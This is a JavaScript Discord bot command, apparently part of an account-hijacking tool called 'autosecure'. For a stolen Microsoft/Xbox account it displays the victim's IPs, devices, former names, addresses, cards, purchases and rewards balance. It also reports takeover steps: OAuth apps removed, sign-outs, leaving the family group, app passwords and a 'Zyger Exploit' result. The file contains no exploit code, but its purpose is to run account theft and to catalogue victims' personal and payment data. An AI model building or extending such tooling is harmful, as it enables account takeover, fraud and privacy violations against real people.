const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require("discord.js");
const { queryParams } = require("../../../db/database");
const config = require("../../../config.json");
const { codeblock } = require("../../../autosecure/utils/process/helpers");

module.exports = {
    name: "extrainformation",
    ownerOnly: true,
    callback: async (client, interaction) => {
        try {
            let [t, uid] = interaction.customId.split("|");

            const results = await queryParams("SELECT * FROM extrainformation WHERE uid = ?", [uid]);

            if (results.length === 0) {
                return interaction.reply({
                    content: "No information found for the provided UID.",
                    ephemeral: true,
                });
            }

            const info = results[0];

            let deviceCount = 0;
            let deviceNames = "N/A";
            let familyText = "None";
            let ogoFirstName = "N/A";
            let ogoLastName = "N/A";
            let oauthCountAfter = 0;
            let oauthCountBefore = null;
            let ipAddresses = "N/A";
            let addresscount = 0;

            if (info.addresses) {
                try {
                    const parsedAddresses = JSON.parse(info.addresses);
                    if (Array.isArray(parsedAddresses) && parsedAddresses.length > 0) {
                        addresscount = parsedAddresses.length;
                    } else {
                        addresscount = 0;
                    }
                } catch {
                    addresscount = 0;
                }
            }

            if (info?.devices) {
                try {
                    const devices = JSON.parse(JSON.parse(info.devices)).devices;
                    if (devices && Array.isArray(devices)) {
                        deviceCount = devices.length;
                        deviceNames = devices.map(device => device.name).join(", ") || "N/A";
                    } else {
                        deviceCount = 0;
                        deviceNames = "N/A";
                    }
                } catch (error) {
                    console.error("Error parsing devices JSON:", error);
                    deviceNames = "Error parsing device data";
                }
            }

            if (info?.ogo) {
                try {
                    const ogoData = JSON.parse(info.ogo);
                    ogoFirstName = ogoData.firstname || "N/A";
                    ogoLastName = ogoData.lastname || "N/A";
                } catch (error) {
                    console.error("Error parsing OGO data:", error);
                    ogoFirstName = "Error parsing first name";
                    ogoLastName = "Error parsing last name";
                }
            }


            if (info?.oauthsafter) {
                try {
                    const oauthDataAfter = JSON.parse(info.oauthsafter);
                    oauthCountAfter = oauthDataAfter.oauthquantity || 0;
                } catch (error) {
                    console.error("Error parsing OAuths after data:", error);
                    oauthCountAfter = 0;
                }
            }

            if (info?.oauthsbefore) {
                try {
                    const oauthDataBefore = JSON.parse(info.oauthsbefore);
                    oauthCountBefore = oauthDataBefore.oauthquantity ?? null;
                } catch (error) {
                    console.error("Error parsing OAuths before data:", error);
                    oauthCountBefore = null;
                }
            }

let oauthDisplay;

if (typeof oauthCountBefore === "number" && typeof oauthCountAfter === "number") {
  const removed = oauthCountBefore - oauthCountAfter;
  oauthDisplay = codeblock(`Removed: ${removed}/${oauthCountBefore}`);
}  else {
                oauthDisplay = oauthCountAfter === 0 ? "```😊```" : `\`\`\`${oauthCountAfter}\`\`\``;
            }

            if (info?.ip) {
                try {
                    let parsedIPs = [];

                    if (Array.isArray(info.ip)) {
                        parsedIPs = info.ip;
                    } else {
                        parsedIPs = JSON.parse(info.ip);
                    }

                    if (!Array.isArray(parsedIPs)) {
                        parsedIPs = String(parsedIPs)
                            .replace(/[\[\]"]/g, '')
                            .split(',')
                            .map(ip => ip.trim());
                    }

                    const filteredIPs = parsedIPs.filter(ip => {
                        const isValid = ip && /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/.test(ip);
                        const isFilteredOut = ip.includes(config.ip4) || ip.includes(config.ip6);
                        return isValid && !isFilteredOut;
                    });

                    ipAddresses = filteredIPs.length > 0 ? filteredIPs.join('\n') : 'N/A';
                    ipAddresses = ipAddresses.trim().replace(/^\n+/, '');
                    const maxLength = 1024;
                    if (ipAddresses.length > maxLength) {
                        ipAddresses = ipAddresses.slice(0, maxLength - 3) + '...';
                    }
                } catch (error) {
                    console.error("Error parsing IP data:", error);
                    ipAddresses = "N/A";
                }
            }

            const deviceDisplay = deviceCount === 0 ? "```😊```" : `\`\`\`${deviceCount}\`\`\``;

            const ds = info.leftfamily ?? "Couldn't find";
            let dss;

            if (ds === 'None') {
                dss = 'None';
            } else if (ds === 'False' || ds === false) {
                dss = "Couldn't leave!";
            } else if (ds === 'True' || ds === true) {
                dss = "Left";
            } else {
                dss = "Couldn't find";
            }

            let msRewardsDisplay = "0";
            if (info?.mspoints) {
                msRewardsDisplay = `${info.mspoints} Points`;

                if (info?.msbalance) {
                    try {
                        const balance = Number(JSON.parse(info.msbalance));
                        if (balance > 0) {
                            msRewardsDisplay += ` | ${balance.toFixed(2)}$ Balance`;
                        }
                    } catch (error) {
                        console.error("Error parsing MS balance:", error);
                    }
                }
            }

            const embed = new EmbedBuilder()
                .setTitle(`Extra Information for \`\`${uid}\`\``)
                .addFields(
                    { name: "Xbox Gamertag", value: `\`\`\`${info?.gtg || "Not found/Failed"}\`\`\``, inline: true },
                    { name: "IP", value: `\`\`\`\n${ipAddresses}\n\`\`\``, inline: true },
                    { name: "Multiplayer", value: `\`\`\`${info?.multiplayer || "N/A"}\`\`\``, inline: true },
                    { name: "App Passwords", value: `\`\`\`${info?.apppasswords || "None to remove"}\`\`\``, inline: true },
                    { name: "Zyger Exploit", value: `\`\`\`${info?.exploit}\`\`\``, inline: true },
                    { name: "Sign Out", value: `\`\`\`${info?.signout}\`\`\``, inline: true },
                    { name: "Family", value: `\`\`\`${dss}\`\`\``, inline: true },
                    { name: "OAuths", value: oauthDisplay, inline: true },
                    { name: "Devices", value: deviceDisplay, inline: true },
                    { name: "MS Rewards", value: `\`\`\`${msRewardsDisplay}\`\`\``, inline: true }
                )
                .setColor('#b2c7e0');

            const row1 = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder().setCustomId(`ogo|${uid}`).setLabel("Old Info").setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder().setCustomId(`oauths|${uid}`).setLabel("OAuths").setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder().setCustomId(`devices|${uid}`).setLabel("Devices").setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder().setCustomId(`cards|${uid}`).setLabel("Cards").setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder().setCustomId(`newinfo|${uid}`).setLabel("New Info").setStyle(ButtonStyle.Secondary)
                );

            const row2 = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder().setCustomId(`purchases|${uid}`).setLabel("Purchases").setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder().setCustomId(`subscriptions|${uid}`).setLabel("Subscriptions").setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder().setCustomId(`family|${uid}`).setLabel("Family").setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder().setCustomId(`addresses|${uid}`).setLabel("Addresses").setStyle(ButtonStyle.Secondary)
                );

            await interaction.reply({ embeds: [embed], components: [row1, row2], ephemeral: true });
        } catch (error) {
            console.error("Error processing extra information:", error);
            return interaction.reply({
                content: "An error occurred while retrieving the information.",
                ephemeral: true,
            });
        }
    }
};
